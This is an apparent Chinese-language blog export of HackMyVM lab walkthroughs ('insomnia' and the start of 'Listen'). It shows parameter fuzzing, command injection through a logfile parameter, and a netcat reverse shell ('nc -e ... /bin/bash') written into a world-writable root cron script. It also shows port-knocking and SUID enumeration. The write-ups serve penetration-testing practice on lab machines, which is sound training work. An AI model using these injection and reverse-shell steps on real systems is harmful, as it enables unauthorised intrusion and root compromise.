<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="meta"># curl http:<span class="comment">//192.168.112.252:8080//administration.php</span></span></span><br><span class="line">You are <span class="keyword">not</span> allowed to <span class="built_in">view</span> : &lt;br&gt;Your activity has been logged</span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="meta"># curl http:<span class="comment">//192.168.112.252:8080/start.sh</span></span></span><br><span class="line">php -S <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8080</span></span><br><span class="line">                                                                           </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="meta"># curl http:<span class="comment">//192.168.112.252:8080/chat.txt   </span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                      </span><br></pre></td></tr></table></figure></div>
<p>没有什么多余信息了，然后的思路是对这个administration.php进行参数爆破，因为这个是个php文件，可能存在后门</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 192.168.112.252:8080//administration.php?FUZZ=id --hh 65</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/<span class="strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"><span class="bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"></span><br><span class="line">Target: http://192.168.112.252:8080//administration.php?FUZZ=id</span><br><span class="line">Total requests: 4744</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"><span class="section">ID           Response   Lines    Word       Chars       Payload   </span></span><br><span class="line"><span class="section">=====================================================================</span></span><br><span class="line"></span><br><span class="line">000002522:   200        2 L      12 W       67 Ch       &quot;logfile&quot; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>找到参数<code>logfile</code>   去网站里面试试<br><img src="https://pic1.imgdb.cn/item/67b1daf2d0e0a243d4ffdc0f.png"><br>发现没有回显，用ping本机，然后用tcpdump看看验证是否可以成功执行命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COS"><figure class="iseeu highlight /cos"><table><tr><td class="code"><pre><span class="line">?logfile=id<span class="comment">;ping -c2 192.168.112.11</span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# tcpdump  -A -n icmp</span><br><span class="line">tcpdump: verbose output suppressed, <span class="keyword">use</span> -v[v]... <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length <span class="number">262144</span> bytes</span><br><span class="line"><span class="number">20</span>:<span class="number">34</span>:<span class="number">03.429775</span> IP <span class="number">192.168</span><span class="number">.112</span><span class="number">.252</span> &gt; <span class="number">192.168</span><span class="number">.112</span><span class="number">.11</span>: ICMP echo request, id <span class="number">6058</span>, seq <span class="number">15</span>, length <span class="number">64</span></span><br><span class="line">E<span class="built_in">..T</span>..@.@..<span class="number">9.</span>.p.<span class="built_in">..p</span>.........<span class="comment">;..g............................ !&quot;#$%&amp;&#x27;()*+,-./01234567</span></span><br><span class="line"><span class="number">20</span>:<span class="number">34</span>:<span class="number">03.429824</span> IP <span class="number">192.168</span><span class="number">.112</span><span class="number">.11</span> &gt; <span class="number">192.168</span><span class="number">.112</span><span class="number">.252</span>: ICMP echo reply, id <span class="number">6058</span>, seq <span class="number">15</span>, length <span class="number">64</span></span><br><span class="line">E<span class="built_in">..To</span>^..@...<span class="built_in">..p</span>.<span class="built_in">..p</span>.........<span class="comment">;..g............................ !&quot;#$%&amp;&#x27;()*+,-./01234567</span></span><br><span class="line"><span class="number">20</span>:<span class="number">34</span>:<span class="number">04.437600</span> IP <span class="number">192.168</span><span class="number">.112</span><span class="number">.252</span> &gt; <span class="number">192.168</span><span class="number">.112</span><span class="number">.11</span>: ICMP echo request, id <span class="number">6058</span>, seq <span class="number">16</span>, length <span class="number">64</span></span><br><span class="line">E<span class="built_in">..T</span>..@.@<span class="built_in">..b</span><span class="built_in">..p</span>.<span class="built_in">..p</span>.........&lt;<span class="built_in">..g</span>............................ !<span class="string">&quot;#$%&amp;&#x27;()*+,-./01234567</span></span><br></pre></td></tr></table></figure></div>
<p>反弹shell<br><img src="https://pic1.imgdb.cn/item/67b1dc7fd0e0a243d4ffdc4c.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -lp 1234          </span><br><span class="line">id</span><br><span class="line">id</span><br><span class="line">id</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)<span class="built_in"></span></span><br><span class="line"><span class="built_in">script </span>-qc /bin/bash /dev/<span class="literal">null</span></span><br><span class="line">www-data@insomnia:~/html$ ^Z</span><br><span class="line">zsh: suspended  nc -lp 1234</span><br><span class="line">                                                                           </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cat bbb                                  </span><br><span class="line">stty<span class="built_in"> raw </span>-echo; fg</span><br><span class="line">                                                                           </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# stty<span class="built_in"> raw </span>-echo; fg</span><br><span class="line">[1]  + continued  nc -lp 1234</span><br><span class="line">                             reset</span><br><span class="line">reset: unknown terminal<span class="built_in"> type </span>unknown</span><br><span class="line">Terminal type? xterm</span><br></pre></td></tr></table></figure></div>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@insomnia</span><span class="symbol">:~/html</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> www-data on <span class="symbol">insomnia:</span></span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> www-data may run the following commands on <span class="symbol">insomnia:</span></span><br><span class="line">    (julia) <span class="symbol">NOPASSWD:</span> /bin/bash /var/www/html/start.sh</span><br><span class="line"></span><br><span class="line">www-data<span class="variable">@insomnia</span><span class="symbol">:~/html</span><span class="variable">$ </span>cat /var/www/html/start.sh</span><br><span class="line">php -S <span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:</span><span class="number">8080</span></span><br></pre></td></tr></table></figure></div>
<p>这个start.sh竟然有写入权限，这个是个sh脚本，那我们直接在脚本里面写&#x2F;bin&#x2F;bash </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">www-data@insomnia:~/html$ ls -al</span><br><span class="line">total 40</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>www-data www-data<span class="number"> 4096 </span>Feb<span class="number"> 16 </span>07:14 .</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>root     root    <span class="number"> 4096 </span>Dec<span class="number"> 17 </span><span class="number"> 2020 </span>..</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data <span class="number"> 426 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>administration.php</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data<span class="number"> 1610 </span>Dec<span class="number"> 20 </span><span class="number"> 2020 </span>chat.js</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data<span class="number"> 4096 </span>Feb<span class="number"> 16 </span>07:39 chat.txt</span><br><span class="line">drwxr-xr-x<span class="number"> 2 </span>www-data www-data<span class="number"> 4096 </span>Dec<span class="number"> 20 </span><span class="number"> 2020 </span>images</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data<span class="number"> 2899 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>index.php</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data<span class="number"> 1684 </span>Dec<span class="number"> 20 </span><span class="number"> 2020 </span>process.php</span><br><span class="line">-rwxrwxrwx<span class="number"> 1 </span>root     root      <span class="number"> 20 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>start.sh</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>www-data www-data<span class="number"> 1363 </span>Dec<span class="number"> 20 </span><span class="number"> 2020 </span>style.css</span><br><span class="line"></span><br><span class="line">www-data@insomnia:~/html$ echo &quot;/bin/bash&quot; &gt;&gt; /var/www/html/start.sh</span><br><span class="line"></span><br><span class="line">www-data@insomnia:~/html$ sudo -u julia /bin/bash /var/www/html/start.sh</span><br><span class="line">[Sun Feb<span class="number"> 16 </span>07:57:36 2025] Failed to listen on 0.0.0.0:8080 (reason: Address already in use)</span><br><span class="line">julia@insomnia:/var/www/html$ id</span><br><span class="line">uid=1000(julia) gid=1000(julia) groups=1000(julia),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)</span><br></pre></td></tr></table></figure></div>
<p> 成功拿到用户的shell<br> <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line"> julia<span class="variable">@insomnia</span>:<span class="regexp">/var/www</span><span class="regexp">/html$ find /</span> -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/de&lt;ml$ find /</span> -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev                        /null</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chfn</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/sudo</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/su</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/newgrp</span></span><br></pre></td></tr></table></figure></div><br>suid没东西 再从本地上传pspy64 看看有没有定时任务</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">julia@insomnia:~$ wget <span class="number">192.168</span>.<span class="number">112.11</span><span class="symbol">/pspy64</span></span><br><span class="line"><span class="operator">-</span>-<span class="number">202</span>5-<span class="number">0</span>2-<span class="number">16</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">4</span>0--  http:<span class="symbol">//192.168.112.11/pspy64</span></span><br><span class="line">Connecting to <span class="number">192.168</span>.<span class="number">112.11</span>:<span class="number">80</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line"><span class="params">Length:</span> <span class="number">3104768</span> (<span class="number">3.0</span>M) [application<span class="operator">/</span>octet-stream]</span><br><span class="line">Saving <span class="params">to:</span> ‘pspy64’</span><br><span class="line"></span><br><span class="line">pspy64             <span class="number">100</span>%[<span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span><span class="operator">&gt;</span>]   <span class="number">2.96</span>M  <span class="operator">-</span>-.-KB<span class="symbol">/s</span>    <span class="keyword">in</span> <span class="number">0.09</span>s   </span><br><span class="line"></span><br><span class="line"><span class="number">202</span>5-<span class="number">0</span>2-<span class="number">16</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">40</span> (<span class="number">34.1</span> MB<span class="operator">/</span>s) <span class="operator">-</span> ‘pspy64’ saved [<span class="number">3104768</span><span class="operator">/</span><span class="number">3104768</span>]</span><br><span class="line"></span><br><span class="line">julia@insomnia:~$ chmod <span class="operator">=</span>x    ^C</span><br><span class="line">julia@insomnia:~$ chmoc ^C</span><br><span class="line">julia@insomnia:~$ chmod <span class="operator">+</span>x pspy64</span><br><span class="line">julia@insomnia:~$ <span class="symbol">./pspy64</span></span><br><span class="line"></span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">58</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2</span>      | </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">58</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">1</span>      | <span class="symbol">/sbin/init</span> </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">01</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">766</span>    | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">01</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">767</span>    | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">01</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">768</span>    | <span class="symbol">/bin/sh</span> <span class="operator">-</span>c    <span class="symbol">/bin/bash</span> <span class="symbol">/var/cron/check.sh</span> </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">01</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">769</span>    | <span class="symbol">/bin/bash</span> <span class="symbol">/var/cron/check.sh</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>发现root真的会执行一个定时任务</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="D"><figure class="iseeu highlight /d"><table><tr><td class="code"><pre><span class="line">julia<span class="keyword">@insomnia</span>:~$ cat /var/cron/check.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">status=$(systemctl <span class="keyword">is</span>-active insomnia.service)</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;$status&quot;</span> == <span class="string">&quot;active&quot;</span>  ]; then</span><br><span class="line">   echo <span class="string">&quot;OK&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   systemctl start  insomnia.service</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></div>
<p>这个文件也有权限</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">julia@insomnia:/var/cron$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>.</span><br><span class="line">drwxr-xr-x<span class="number"> 13 </span>root root<span class="number"> 4096 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>..</span><br><span class="line">-rwxrwxrwx <span class="number"> 1 </span>root root <span class="number"> 153 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>check.sh</span><br></pre></td></tr></table></figure></div>
<p>和刚才用户一样的思路，直接写反弹shell让root执行拿到root的shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">julia<span class="variable">@insomnia</span><span class="symbol">:/var/cron</span><span class="variable">$ </span>echo <span class="string">&quot;nc -e 192.168.112.11 1234 /bin/bash&quot;</span> &gt; check.sh</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nc -lp 1234</span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure></div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>又学习了目录扫描时候的一些操作，比如加上后缀，接受特定的状态码，然后是php的参数注入，加强wfuzz这个工具的利用<br>后面提权的部分还是很简单的，都是可以写入的文件，还是root的</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Listen</title>
    <url>/posts/24112.html</url>
    <content><![CDATA[<p>HMV-Listen靶场复盘<br>本来想先做Vulnyx的Listen但是我用平时的方法修改不了ip，做不了</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67a6bd2bd0e0a243d4fcdfd2.png"></p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.179.158       </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2025</span><span class="number">-02</span><span class="number">-08</span> <span class="number">10</span>:<span class="number">13</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span> (<span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span>)</span><br><span class="line">Host is up (<span class="number">0.0022</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp filtered ssh</span><br><span class="line"><span class="number">80</span>/tcp filtered <span class="keyword">http</span></span><br><span class="line">MAC Address: <span class="number">56</span>:<span class="number">6</span>C:<span class="number">79</span>:<span class="number">7</span>A:<span class="number">84</span>:<span class="number">65</span> (Unknown)</span><br><span class="line">Too many fingerprints match this host <span class="built_in">to</span> give specific OS details</span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.22</span> ms <span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span> (<span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span>)</span><br><span class="line"></span><br><span class="line">OS <span class="keyword">and</span> Service detection performed. Please report <span class="keyword">any</span> incorrect results <span class="keyword">at</span> <span class="keyword">https</span>://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">3.20</span> <span class="built_in">seconds</span></span><br></pre></td></tr></table></figure></div>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>web首页没有什么信息</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.169.179.158    </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;Cache-control&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;no-cache&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;0;URL=/cgi-sys/defaultwebpage.cgi&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>做之前群主有提醒，Listen这个名字就是要流量监听，所以用wireshark<br>wireshark这个应用我直接打开监听，提示我权限不足，搜索后用sudo打开 （mac系统）</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SWIFT"><figure class="iseeu highlight /swift"><table><tr><td class="code"><pre><span class="line">(base) kakeru<span class="meta">@bogon</span> <span class="regexp">/Applications % sudo /</span><span class="type">Applications</span><span class="regexp">/Wireshark.app/</span><span class="type">Contents</span><span class="regexp">/MacOS/</span><span class="type">Wireshark</span></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67a6cd6fd0e0a243d4fce6f1.png"><br>抓包后筛选靶机的ip，查看包内容，发现需要knock 1337端口，用到了knock服务，我要去修改一下这个配置<br>因为开机前获取不到ip，修改了靶机网卡，knock配置也要改 位置在&#x2F;etc&#x2F;knockd.conf<br><img src="https://pic1.imgdb.cn/item/67a6cd6bd0e0a243d4fce6ef.png"><br>另一个包给了用户名和密码<br>konck这个端口之后，靶机的22和80端口就都打开了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># knock 192.168.179.158 1337 -v          </span></span><br><span class="line">hitting tcp <span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span>:<span class="number">1337</span></span><br><span class="line">                                                                                                                     </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nmap -p- 192.168.179.158</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2025</span><span class="number">-02</span><span class="number">-08</span> <span class="number">10</span>:<span class="number">29</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span> (<span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span>)</span><br><span class="line">Host is up (<span class="number">0.00061</span>s latency).</span><br><span class="line">Not shown: <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span></span><br><span class="line">MAC Address: <span class="number">56</span>:<span class="number">6</span>C:<span class="number">79</span>:<span class="number">7</span>A:<span class="number">84</span>:<span class="number">65</span> (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">2.77</span> <span class="built_in">seconds</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>然后就可以用ssh登录到silence用户</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>没有sudo权限<br>但是suid有一个home目录下leo用户的文件有suid</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">silence<span class="variable">@listen</span>:~<span class="variable">$ </span>find / -perm -<span class="number">4000</span> -user root -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/gpasswd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/passwd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chsh</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/newgrp</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/home/leo</span><span class="regexp">/poem</span></span><br><span class="line"><span class="regexp">silence@listen:~$ cd /home</span></span><br><span class="line">silence<span class="variable">@listen</span>:<span class="regexp">/home$ ls</span></span><br><span class="line"><span class="regexp">leo  listen  silence</span></span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">silence<span class="variable">@listen</span><span class="symbol">:/home</span><span class="variable">$ </span>cd silence/</span><br><span class="line">silence<span class="variable">@listen</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">listen.sh  note.txt</span><br><span class="line">silence<span class="variable">@listen</span><span class="symbol">:~</span><span class="variable">$ </span>listen.sh</span><br><span class="line">-<span class="symbol">bash:</span> <span class="symbol">listen.sh:</span> command <span class="keyword">not</span> found</span><br><span class="line">silence<span class="variable">@listen</span><span class="symbol">:~</span><span class="variable">$ </span>cat note.txt </span><br><span class="line"><span class="string">&quot;listen&quot;</span> told me that <span class="keyword">if</span> I listen, I will hear his password....</span><br></pre></td></tr></table></figure></div>
<p>提示listen “listen”用户可以得到密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="D"><figure class="iseeu highlight /d"><table><tr><td class="code"><pre><span class="line">silence<span class="keyword">@listen</span>:~$ cat listen.sh </span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">cat /home/listen/password.txt &gt; /dev/pts/<span class="number">4</span></span><br></pre></td></tr></table></figure></div>
<p>运行这个脚本之后就可以得到密码，但是现在没有执行权限，只是可读的<br>这里卡住了一会，看了下wp，原来这个pts&#x2F;4 是终端的窗口，所以开4个终端窗口，在第四个终端中就能看到<br>这个应该是个定时任务，等待一会就会在第四个终端窗口中出现密码(开四个ssh全都连接到silence)<br><img src="https://pic1.imgdb.cn/item/67a6cd85d0e0a243d4fce6f5.png"></p>
